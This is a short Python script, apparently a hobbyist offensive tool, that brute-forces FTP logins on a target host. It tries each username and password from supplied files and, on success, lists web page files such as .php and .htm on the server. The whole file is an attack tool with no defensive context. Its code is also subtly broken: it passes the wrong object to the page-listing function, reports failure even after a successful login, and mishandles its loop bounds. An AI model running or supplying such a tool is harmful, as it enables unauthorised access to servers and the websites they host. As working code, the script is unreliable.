import optparse
import ftplib
from threading import *

def returnDefault(ftp):
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print('[-] Could not List any sites')
		return
	retList = []
	for filename in dirList:
		fn = filename.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print("[+] Default page found: "+fn)
			retList.append(fn)
	return retList
def bruteFtp(hostname,username,password):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(username,password)
		print('[+] Logedin: '+username+' | '+password)
		returnDefault(ftplib)
		ftp.quit()
	except Exception as e:
		pass
	print('[-] No luck with: '+username+':'+password)
	return(None,None)

def main():
	parser = optparse.OptionParser('usage%prog'+' -H <target host> -u <ftp user file> -p <ftp password file>')
	parser.add_option('-H', dest='hostname', type='string', help='Specify the target host')
	parser.add_option('-u', dest='ufile', type='string', help='Specify the ftp list file')
	parser.add_option('-p', dest='pfile', type='string', help='Specify the password file')
	(options,args) = parser.parse_args()

	hostname = options.hostname
	ufile = options.ufile
	pfile = options.pfile
	uf = open(ufile,'r')
	pf = open(pfile, 'r')
	userCounter = 0
	userCounterMax = 0
	pwCounter = 0
	pwCounterMax = 0
	pw = []
	un = []
	for uline in uf:
		un.append(uline.strip('\r').strip('\n'))
		userCounterMax = userCounterMax + 1
	for pline in pf:
			pw.append(pline.strip('\r').strip('\n'))
			pwCounterMax = pwCounterMax + 1
	while userCounter <= userCounterMax and pwCounter < pwCounterMax:
		#t = Thread(target=bruteFtp, args=(hostname,username,pw[i]))
		#t.start()
		bruteFtp(hostname,un[userCounter],pw[pwCounter])
		pwCounter += 1
		if pwCounter == pwCounterMax-1:
			pwCounter = 0
			userCounter += 1
if __name__ == '__main__':
	main()